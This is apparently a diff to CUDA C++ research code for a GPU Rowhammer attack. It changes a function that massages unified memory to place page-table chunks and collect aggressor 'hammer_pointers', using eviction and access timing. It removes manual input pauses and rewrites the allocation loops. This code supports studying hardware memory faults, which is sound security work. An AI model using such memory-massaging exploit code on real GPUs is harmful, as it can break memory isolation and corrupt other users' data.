@@ -8,6 +8,8 @@
 #include <cmath>
 #include <numeric>
 #include <chrono>
+#include <random>
+#include <algorithm>
 #include <rh_kernels.cuh>
 #include <rh_utils.cuh> 
 #include <rh_impls.cuh>
@@ -196,11 +198,6 @@ bool first_PT_chunk_fill(uint64_t num_alloc_init, uint64_t num_alloc, uint64_t a
     good_agg = get_aggressors(rows, min_rowId, num_victim + 1, row_step);
 
     char *temp;
-    // std::cout << "Memory Allocated" << '\n';
-    std::cin.clear();
-    std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\n');
-    std::cin >> timein;
-
     /**
      * Rational:
      *  Given PTC is pushed down as you allocate more memory, 
@@ -216,77 +213,51 @@ bool first_PT_chunk_fill(uint64_t num_alloc_init, uint64_t num_alloc, uint64_t a
     uint64_t last_hammer_page = static_cast<uint64_t>(rows[max_rowId - 5][0] - layout) / (2UL * 1024 * 1024);
     uint16_t to_reserve = last_hammer_page - first_hammer_page;
     std::vector<uint8_t*> hammer_pointers;
-    for (uint64_t i = 0; i < num_alloc; i += 1)
+
+    for (uint64_t i = 0; i < to_reserve; i++)
     {
-        if (num_alloc < alloc_id)
-        {  
-            if (i >= (num_alloc - to_reserve - 1))
-            {
-                std::cout << alloc_id  + i - num_alloc << ' ' << (void*) alloc_ptrs[alloc_id  + i - num_alloc] << '\n';
-                for (int j = 0; j < 2 * 1024 * 1024; j += 4 * 1024)
-                    *(alloc_ptrs[alloc_id  + i - num_alloc] + j) = 'U';
-            }
-            else
-                for (int j = 0; j < 2 * 1024 * 1024; j += 4 * 1024)
-                        *(alloc_ptrs[i] + j) = 'U';
-            if (i == num_alloc - 1)
-            {
-                std::cout << alloc_id << ' ' << (void*) alloc_ptrs[alloc_id] << '\n';
-                for (int j = 0; j < 2 * 1024 * 1024; j += 4 * 1024)
-                    *(alloc_ptrs[alloc_id] + j) = 'U';
-            }
-        }
-        
-
-        // Create Free Space
-        cudaMallocManaged(&temp, 2 * 1024 * 1024);
-        auto start = std::chrono::high_resolution_clock::now();
-        initialize_memory<<<1,1>>>(temp, 2 * 1024 * 1024);
-        cudaDeviceSynchronize();
-        auto end = std::chrono::high_resolution_clock::now();
-
-
-        if (i >= num_alloc - 2)
-            initialize_memory_full<<<1,1>>>(temp, 2 * 1024 * 1024);
-        if (i >= (num_alloc - to_reserve - 1))
-        {
-            std::cout << alloc_id - num_alloc + i << '\n';
-            hammer_pointers.push_back((uint8_t*)temp);
-        }
-        cudaDeviceSynchronize();
-        gpuErrchk(cudaPeekAtLastError());
-        std::chrono::duration<double, std::milli> duration_evict = end - start;
-        double currentMS = duration_evict.count();
-
-        before_chunk_ptrs[i] = temp;
-        std::cout << i << " New PT time: " << duration_evict.count() << " ms"<< std::endl;
-
-        // Generate Page Table for 64KB Pages.
-        *(temp + 0) = 'U';
-
-        if (i < skip)
-            continue;
+        evict_from_device(alloc_ptrs[first_hammer_page + i], ALLOC_SIZE);
+        cudaMallocManaged(&temp, ALLOC_SIZE);
+        time_data_access(temp, ALLOC_SIZE);
+        hammer_pointers.push_back((uint8_t*)temp);
+        std::cout << first_hammer_page + i << '\n';
     }
 
-    std::cout << first_hammer_page << '\n';
-    std::cout << last_hammer_page << '\n';
+    uint64_t next_id = num_alloc_init;
+    for (uint64_t i = 0; i < num_alloc_init; i += 1)
+    {
+        if (i == next_id)
+            evict_from_device(alloc_ptrs[last_hammer_page], ALLOC_SIZE);
+
+        // Create Free Space
+        cudaMallocManaged(&temp, ALLOC_SIZE + 4096);
+
+        double currentMS = time_data_access(temp + ALLOC_SIZE, 1);
+        std::cout << i << " New PT time: " << currentMS << " ms"<< std::endl;
+
+        before_chunk_ptrs[i] = temp;
+        if (i < skip || i % 512 == 0)
+            continue;
+
+        if (i == next_id)
+            break;
+        if (currentMS > threshold && next_id == num_alloc_init)
+            next_id = i + 508;
+    }
+
     std::cout << "First PTC Generated " << '\n';
-    std::cin.clear();
-    std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\n');
-    std::cin >> timein;
+    pause();
 
     /* Free up CPU memory by releasing the evicted memories */
     cudaFree(alloc_ptrs[0]);
     free(alloc_ptrs);
 
-    for (uint64_t i = 0; i < num_alloc - to_reserve - 1; i += 1)
+    for (uint64_t i = 0; i < next_id; i += 1)
         cudaFree(before_chunk_ptrs[i]);
     free(before_chunk_ptrs);
 
     std::cout << "Prior Mem Freed " << '\n';
-    std::cin.clear();
-    std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\n');
-    std::cin >> timein;
+    pause();
 
     std::cout << std::dec;
     if (first_ptc_ptrs)
@@ -301,7 +272,6 @@ bool first_PT_chunk_fill(uint64_t num_alloc_init, uint64_t num_alloc, uint64_t a
     if (evict_ptr)
         *evict_ptr = temp;
 
-    
     char** temp_ptrs = (char **)malloc((250) * sizeof(char*));
     for (uint64_t i = 0; i < 250; i += 1)
     {
@@ -339,21 +309,7 @@ bool first_PT_chunk_fill(uint64_t num_alloc_init, uint64_t num_alloc, uint64_t a
         cudaFree(temp_ptrs[i]);
     free(temp_ptrs);
 
-    std::cout << to_reserve << '\n';
-    std::cout << hammer_pointers.size() << '\n';
-    std::cout << "First PTC Filled " << '\n';
-    std::cin.clear();
-    std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\n');
-    std::cin >> timein;
-
-    for (uint64_t i = 10000; i < num_alloc_init - 50 - to_reserve - 4; i += 1)
-    // for (uint64_t i = 10000; i < 10100; i += 1)
-    {
-        // Create Free Space
-        // std::this_thread::sleep_for(std::chrono::milliseconds(5));
-
-        // Create Free Spaces
-        for (int j = 0; j < 1; j++)
+    for (uint64_t i = 0; i < num_alloc_init - 50 - to_reserve - 4; i += 1)
         {
             cudaMallocManaged (&temp, 2 * 1024 * 1024);
             auto start = std::chrono::high_resolution_clock::now();
@@ -368,32 +324,42 @@ bool first_PT_chunk_fill(uint64_t num_alloc_init, uint64_t num_alloc, uint64_t a
 
             if (first_ptc_ptrs)
                 (*first_ptc_ptrs)[i] = temp;
-    
-            // cudaMallocManaged (&temp, 2 * 1024 * 1024);
-            // auto start = std::chrono::high_resolution_clock::now();
-            // initialize_memory<<<1,1>>>(temp + 64 * 1024, 1);
-            // cudaDeviceSynchronize();
-            // auto end = std::chrono::high_resolution_clock::now();
-
-            // gpuErrchk(cudaPeekAtLastError());
-            // std::chrono::duration<double, std::milli> duration_evict = end - start;
-            // double currentMS = duration_evict.count();
-            // std::cout << i << " New PT time: " << duration_evict.count() << ' ' << (void*)temp << " ms"<< std::endl;
-
-            // if (first_ptc_ptrs)
-            //     (*first_ptc_ptrs)[i] = temp;
-
 
             *temp = 'a';
-            // if (j == 0)
-            //     cudaFree(temp);
-        }
 
-        // Generate Page Table for 64KB Pages.
-        // *(temp + 0) = 'a';
-        if (i < skip)
-            continue;
-    }
+            if (i < skip)
+                continue;
+        }
+    // pause();
+    // auto rng = std::default_random_engine {42};
+    // for (int j = 0; j < 3; j++)
+    // {
+    //     std::shuffle(*first_ptc_ptrs, *(first_ptc_ptrs) + num_alloc_init - 50 - to_reserve - 4, rng);
+    //     for (int i = 0; i < num_alloc_init - 50 - to_reserve - 4; i++)
+    //         cudaFree((*first_ptc_ptrs)[i]);
+    //     for (uint64_t i = 0; i < num_alloc_init - 50 - to_reserve - 4; i += 1)
+    //     {
+    //         cudaMallocManaged (&temp, 2 * 1024 * 1024);
+    //         auto start = std::chrono::high_resolution_clock::now();
+    //         initialize_memory<<<1,1>>>(temp, 2 * 1024 * 1024);
+    //         cudaDeviceSynchronize();
+    //         auto end = std::chrono::high_resolution_clock::now();
+
+    //         gpuErrchk(cudaPeekAtLastError());
+    //         std::chrono::duration<double, std::milli> duration_evict = end - start;
+    //         double currentMS = duration_evict.count();
+    //         std::cout << i << " New PT time: " << duration_evict.count() << ' ' << (void*)temp << " ms"<< std::endl;
+
+    //         if (first_ptc_ptrs)
+    //             (*first_ptc_ptrs)[i] = temp;
+
+    //         *temp = 'a';
+
+    //         if (i < skip)
+    //             continue;
+    //     }
+    //     pause();
+    // }
 
     std::cout << to_reserve << '\n';
     std::cout << hammer_pointers.size() << '\n';
